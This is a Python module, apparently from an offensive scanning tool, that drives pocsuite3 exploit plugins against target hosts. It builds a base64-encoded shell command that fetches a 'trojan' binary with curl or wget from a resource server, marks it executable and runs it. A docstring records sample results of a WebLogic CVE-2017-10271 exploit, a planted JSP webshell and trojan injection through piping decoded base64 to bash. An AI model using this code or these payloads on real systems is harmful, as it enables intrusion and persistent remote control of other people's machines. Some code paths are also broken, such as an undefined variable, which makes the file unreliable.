import re
import os
import sys
sys.path.append('/root/go/src/github.com/wh1t3zer/Hawkeye')
import base64
from micro.service.asset_scanner.settings import RESOURCE_ADDR, TROJANMQ_ADDR, REGISTRY_ADDR
# from settings import RESOURCE_ADDR, TROJANMQ_ADDR, REGISTRY_ADDR
from micro.handler import common
from pocsuite3.api import init_pocsuite, start_pocsuite, get_results


class Pocsuite:
    def __init__(self, target: str, vul_id: str = None, poc_content: str = None, plugins: list = [], asset_id: str = None, command: str = None):
        self.target = target
        self.pocs = self._set_attr(vul_id, poc_content, plugins)
        # self.pocs = self._get_plugins(plugins)
        self.asset_id = asset_id
        self.command = self._base64_cmd(command)      # 明文加密
        self.default_schema = 'http'

    def _set_attr(self, vul_id, poc_content, plugins):
        if poc_content:
            filepath = "{}/{}.py".format(common.POC_PLUGINS_DIR, vul_id)
            with open(filepath, "w") as f:
                f.write(poc_content)
            return set([filepath])
        else:
            return self._get_plugins(plugin_list)

    def _get_plugins(self, pocs: list) -> set:
        result = []
        # 若没有填写插件, 加载本地插件
        if not pocs:
            for root, dirs, files in os.walk(common.POC_PLUGINS_DIR):
                print("[*] 加载本地插件...")
                if not files:
                    print("[*] 没有检测到Poc插件！！！")
                    return
                return self._get_plugins(files)
        for poc in pocs:
            result.append("{}/{}".format(common.POC_PLUGINS_DIR, poc))
        return set(result)

    def _base64_cmd(self, command):
        '''
        wget\curl都没有的话就没办法注入木马了
        '''
        curl_cmd = "curl -O {}/trojan/trojan".format(RESOURCE_ADDR)
        wget_cmd = "wget {}/trojan/trojan".format(RESOURCE_ADDR)
        doanload_trojan = "curl -V &> /dev/null; if [ $? -eq 0 ];then {}; else wget -V &> /dev/null; if [ $? -eq 0 ];then {}; fi; fi".format(curl_cmd, wget_cmd)
        cmd = "{} && chmod +x trojan&& ./trojan --server_metadata mq={} --registry_address {}".format(doanload_trojan, TROJANMQ_ADDR, REGISTRY_ADDR)
        if self.asset_id:
            cmd = "{} && chmod +x trojan&& ./trojan --server_metadata id={} --server_metadata mq={} --server_name {} --registry_address {}"
            cmd = cmd.format(doanload_trojan, self.asset_id, TROJANMQ_ADDR, self.asset_id, REGISTRY_ADDR)

        byte = base64.b64encode(cmd.encode('utf-8'))
        return byte.decode('utf-8')

    # pocsuite3默认仅支持http、https协议, 所以增加自定义字段schema
    def parse_target(self) -> dict:
        result = {'schema': self.default_schema, 'host': self.target}
        schema_pattern = re.compile("(.*)://.*")
        port_pattern = re.compile(":(\d+)")
        host = re.sub("\w+://|:\d+|", "", self.target)
        schema = schema_pattern.findall(self.target)
        port = port_pattern.findall(self.target)
        if host:
            result["host"] = host
        if schema:
            result["schema"] = schema[0]
        if port:
            if port[0] == '80' and result['schema'] == 'http':
                pass
            elif port[0] == '443' and result['schema'] in 'https':
                result['schema'] = 'https'
            else:
                result['host'] += ':' + port[0]
        print(result)
        return result  # host字段最多出现主机+端口, 不涉及协议

    def Verify(self, expolit=False):
        print("ecz==>")
        pattern = self.parse_target()
        config = {
            'url': set([pattern['host']]),  # 不能传输协议
            'poc': self.pocs,
            'schema': pattern['schema'],    # 这里写协议
            'command': self.command,        # base64命令
            'expolit': expolit,
        }
        print(config)
        init_pocsuite(config)
        start_pocsuite()
        return get_results().pop().result
        '''
        {
            'VerifyInfo': {
                'URL': 'http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl',
                'PostData': '<string>/bin/bash</string>\n <string>-c</string>\n <string>touch xxx2.txt</string>',
                'Result': 'Find Keyinfo In Response Data, Info: <faultcode>S:Server</faultcode><faultstring>0</faultstring>'
            },
            'ExploitInfo': {
                'URL': 'http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl',
                'PostData': '<string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/1000011.txt</string>\n <string>Weblogic Vulnerability Test!</string>',
                'Result': 'Exploit Successfully, touch file of content=[Weblogic Vulnerability Test!\n] and effect http://172.31.50.252:7001/wls-wsat/1000011.txt'},
            'WebshellInfo': {
                'URL': 'http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl',
                'PostData': '<string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.jsp</string><string>out.print("<pre>")out.print("</pre>")',
                'Result': 'Exploit Successfully, Get response_data=[<pre>root</pre>] by execute command effect webshell http://172.31.50.252:7001/wls-wsat/test.jsp?pwd=023&i=whoami'
            },
            'TrojanInfo': {
                'URL': 'http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl',
                'PostData': '<string>/bin/bash</string>\n <string>-c</string>\n <string>echo (base64) | base64 -d | bash</string>',
                'Result': 'Inject Trojan Successfully'
            }
        }
        '''


if __name__ == "__main__":
    plugin_list = ['Weblogic_171023_wls_CVE_2017_10271_RCE.py']
    targs = 'http://172.31.50.252:7001'
    p = Pocsuite(target=targs, vul_id="0001", poc_content="impoirt eee", asset_id="9527")  # target: str, pocs: list, asset_id: str = None, command: str = None
    print(p.pocs)
    # print(p.Verify(True))
    # {'/root/go/src/github.com/wh1t3zer/Hawkeye/micro/service/asset_scanner/poc_plugins/Flink_201111_Unauth_RCE.py',
    # '/root/go/src/github.com/wh1t3zer/Hawkeye/micro/service/asset_scanner/poc_plugins/Weblogic_171023_wls_CVE_2017_10271_RCE.py'}
    # {/root/go/src/github.com/wh1t3zer/Hawkeye/micro/service/asset_scanner/poc_plugins/0001.py'}
